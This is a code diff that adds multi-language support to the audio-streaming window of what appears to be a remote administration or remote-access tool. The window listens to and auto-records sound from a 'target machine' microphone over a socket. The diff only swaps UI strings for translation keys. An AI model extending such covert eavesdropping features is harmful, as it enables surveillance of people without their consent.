@@ -12,6 +12,11 @@ import wave
 from main_ui import Ui_Form
 
 from libs.modechat import get, send
+from libs.language import Translate
+
+# Multi Lang
+translate = Translate()
+_ = lambda _word: translate.word(_word)
 
 
 class mainPopup(QWidget, Ui_Form):
@@ -24,13 +29,21 @@ class mainPopup(QWidget, Ui_Form):
         self.socket = args['socket']
         self.ipAddress = args['ipAddress']
 
-        self.setWindowTitle('Audio Streaming from - %s - Socket #%s' % (self.ipAddress, self.socket))
+        self.setWindowTitle(_('MAUDIO_TITLE') % (self.ipAddress, self.socket))
+
+        self.listenButton.setText(_('MAUDIO_START'))
+        self.recordButton.setText(_('MAUDIO_RECORD'))
+        self.stopButton.setText(_('MAUDIO_STOP'))
+        self.defaultInputDeviceLabel.setText(_('MAUDIO_AUDIO_DEVICE'))
+        self.rateLabel.setText(_('MAUDIO_RATE'))
+        self.groupBox.setTitle(_('MAUDIO_AUTOMATIC_RECORD'))
+        self.detectRecordLabel.setText(_('MAUDIO_DETECT_SOUND'))
 
         self.stopButton.setDisabled(True)
 
         default_audio_device = get(self.sock, 'getDefaultInputDeviceName', 'getname')
         if default_audio_device == 'NoDevice':
-            msg = QMessageBox(QMessageBox.Information, 'Error', 'No Recording Device Detected On Target Machine')
+            msg = QMessageBox(QMessageBox.Information, _('MAUDIO_MSG_TITLE'), _('MAUDIO_MSG_TEXT'))
             msg.exec_()
             self.setDisabled(True)
 
@@ -152,7 +165,7 @@ class ListenAudio(threading.Thread):
 
         self.active_recording = False
 
-        self.status = 'Not Recording'
+        self.status = _('MAUDIO_NOT_RECORDING')
 
         self.folder = os.path.join('ServersData', id, 'Audio')
         if not os.path.exists(self.folder):
@@ -184,7 +197,7 @@ class ListenAudio(threading.Thread):
         self.recording_file.writeframes(chunk)
         if volume >= self.volume_for_recording:
             self.active_recording = True
-            self.status = 'Recording'
+            self.status = _('MAUDIO_RECORDING')
             self.cur_silent_count = 0
         else:
             self.cur_silent_count += 1
@@ -192,7 +205,7 @@ class ListenAudio(threading.Thread):
                 if self.active_recording:
                     self.recording_file.close()
                     self.recording_file = self.file_for_record(self.new_file())
-                    self.status = 'No Sound'
+                    self.status = _('MAUDIO_NO_SOUND')
                     self.active_recording = False
                 self.cur_silent_count = 0
 
